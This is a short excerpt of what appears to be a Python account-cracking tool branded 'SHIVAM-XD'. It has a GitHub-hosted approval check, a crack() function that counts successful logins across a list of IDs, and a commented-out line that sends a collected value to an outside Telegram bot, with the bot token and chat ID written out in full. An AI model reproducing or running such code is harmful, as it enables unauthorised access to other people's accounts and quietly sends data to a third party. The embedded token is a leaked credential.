...
scheck = requests.get("https://github.com/Shivamxwd7/Approval/blob/main/Approval.txt").text
if sts in scheck:
    pass
else: 
...
#                requests.get("https://api.telegram.org/bot6235354629:AAFNOGVhKY_uWOlVsr5Yvezex9EqgehGmPU/sendMessage?chat_id=5728361296&text=" + linkkk)
...
__uuid = str(os.geteuid())+"SHIVAM"+str(os.geteuid())
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r {P}[SHIVAM-XD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
